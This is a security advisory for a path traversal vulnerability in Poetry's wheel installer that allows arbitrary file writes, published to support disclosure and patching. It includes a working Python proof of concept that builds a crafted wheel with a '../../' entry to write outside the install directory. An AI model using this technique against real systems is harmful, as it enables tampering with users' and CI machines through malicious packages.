# [H] Poetry Has Wheel Path Traversal Which Can Lead to Arbitrary File Write

## Summary
Severity: High
Advisory: GHSA-2599-h6xx-hpxp
CVE: CVE-2026-34591
CWE: CWE-22
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-2599-h6xx-hpxp
Type: github-advisory

## Affected
- PyPI: `poetry` — affected >=1.4.0 <2.3.3

## Details
### Summary
A crafted wheel can contain ../ paths that Poetry writes to disk without containment checks, allowing arbitrary file write with the privileges of the Poetry process. 

### Impact
Arbitrary file write (path traversal) from untrusted wheel content. Impacts users/CI/CD systems installing malicious or compromised packages.

### Patches

Versions 2.3.3 and newer of Poetry resolve the target paths and ensure that they are inside the target directory. Otherwise, installation is aborted.

### Details
Poetry’s wheel destination path is built by directly joining an untrusted wheel entry path:

src/poetry/installation/wheel_installer.py:47
src/poetry/installation/wheel_installer.py:59

The vulnerable sink is reachable in normal installation:
src/poetry/installation/executor.py:607

No resolve() + is_relative_to() style guard is enforced before writing.

### POC

```
from pathlib import Path
import tempfile, zipfile, sys
from installer import install
from installer.sources import WheelFile
from poetry.installation.wheel_installer import WheelDestination

root = Path(tempfile.mkdtemp(prefix="poetry-poc-"))
wheel = root / "evil-0.1-py3-none-any.whl"
base = root / "venv" / "lib" / "pythonX" / "site-packages"
for d in [base, root/"venv/scripts", root/"venv/headers", root/"venv/data"]:
    d.mkdir(parents=True, exist_ok=True)

files = {
    "evil/__init__.py": b"",
    "../../pwned.txt": b"owned\n",
    "evil-0.1.dist-info/WHEEL": b"Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
    "evil-0.1.dist-info/METADATA": b"Metadata-Version: 2.1\nName: evil\nVersion: 0.1\n",
}
files["evil-0.1.dist-info/RECORD"] = ("\n".join([f"{k},," for k in files] + ["evil-0.1.dist-info/RECORD,,"])+"\n").encode()

with zipfile.ZipFile(wheel, "w") as z:
    for k,v in files.items(): z.writestr(k,v)

dest = WheelDestination(
    {"purelib":str(base),"platlib":str(base),"scripts":str(root/"venv/scripts"),"headers":str(root/"venv/headers"),"data":str(root/"venv/data")},
    interpreter=sys.executable, script_kind="posix"
)
with WheelFile.open(wheel) as src:
    install(src, dest, {"INSTALLER": b"PoC"})

out = (base / "../../pwned.txt").resolve()
print("outside write:", out.exists(), out)
```

## References
- https://github.com/python-poetry/poetry/security/advisories/GHSA-2599-h6xx-hpxp
- https://nvd.nist.gov/vuln/detail/CVE-2026-34591
- https://github.com/python-poetry/poetry/pull/10792
- https://github.com/python-poetry/poetry
- https://github.com/python-poetry/poetry/releases/tag/2.3.3
- http://github.com/python-poetry/poetry/commit/ed59537ac3709cfbdbf95d957de801c13872991a
